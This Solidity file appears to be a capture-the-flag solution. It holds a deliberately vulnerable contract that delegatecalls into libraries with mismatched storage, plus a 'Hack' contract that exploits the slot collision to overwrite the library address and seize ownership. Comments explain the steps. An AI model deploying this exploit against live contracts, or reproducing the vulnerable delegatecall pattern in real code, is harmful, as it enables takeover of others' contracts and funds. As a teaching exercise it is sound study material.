// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time; //When this is called from setFirstTime of Preservation, slot 0 is being updated(since storedTime is in slot 0), so slot 0 will be updated in Preservation contract
  }
}

contract Hack {
  address public a1;
  address public a2;
  address public owner; 
  function hack(Preservation cont) public {
    cont.setFirstTime(uint256(uint160(address(this))));
    cont.setFirstTime(uint256(uint160(0x182a251472D59e0E2942552382b395e99E87AA67)));
  }
  function setTime(uint _time) public {
    owner = address(uint160(_time)); //when this function is called, a variable from 3rd slot is set(since owner is being set and its in 3rd slot according to this contract), so variable in 3rd slot (be it be anything/any data type) will be set in Preservation contract.
  }
}

//NOTE: uint can't be directly converted to address so first convert to uint160 and then to address and vice-versa.

//Hack:
//Call hack of Hack by passing Preservation's address. --> It will update timeZone1Library variable to Hack contract address.
// And the second line of this function will call setTime of Hack which will update the owner variable.
